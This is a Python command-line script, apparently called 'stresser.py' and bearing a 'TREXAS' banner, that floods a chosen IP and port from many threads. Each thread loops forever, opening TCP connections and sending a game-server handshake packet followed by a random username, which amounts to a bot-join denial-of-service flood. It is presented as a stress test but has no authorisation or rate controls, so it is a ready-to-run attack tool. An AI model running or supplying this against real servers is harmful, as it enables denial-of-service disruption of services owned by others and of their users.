import socket
import threading
import sys
import time
import random
import string
import concurrent.futures

# ASCII-Art Banner
print ("""
████████╗██████╗ ███████╗██╗  ██╗ █████╗ ███████╗
╚══██╔══╝██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██╔════╝
   ██║   ██████╔╝█████╗   ╚███╔╝ ███████║███████╗
   ██║   ██╔══██╗██╔══╝   ██╔██╗ ██╔══██║╚════██║
   ██║   ██║  ██║███████╗██╔╝ ██╗██║  ██║███████║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                 
""")

def generate_username():
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(10))

def stress_test(host, port, connects, thread_id):
    while True:
        try:
            username = generate_username()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)  # Set a lower timeout for faster retries
            sock.connect((host, port))
            sock.sendall(b'\x06\x00/\x00\x00\x00\x02\x0c\x00\n' + username.encode())
            connects[0] += 1
            print(f'Thread-{thread_id} [{connects[0]} / {username}] SUCCESS!')
            sock.close()
        except Exception as e:
            print(f'Thread-{thread_id} [{connects[0]} / {username}] FAILED: {e}')

def main():
    if len(sys.argv) != 5:
        print('Usage: python3 stresser.py IP PORT SOCKETS THREADS')
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])
    sockets = int(sys.argv[3])
    threads = int(sys.argv[4])

    connects = [0]  # Using a list to allow modification in threads

    print(f'Starting stress test on IP: {host} with port {port} using {threads} threads and {sockets} sockets per thread.')

    # Using ThreadPoolExecutor for better thread management and scalability
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(threads):
            futures.append(executor.submit(stress_test, host, port, connects, i + 1))
        
        # Monitor for completion or allow for cancellation
        try:
            for future in concurrent.futures.as_completed(futures):
                pass
        except (KeyboardInterrupt, SystemExit):
            print("\nTest stopped by user.")
            executor.shutdown(wait=False)
            sys.exit()

if __name__ == "__main__":
    main()
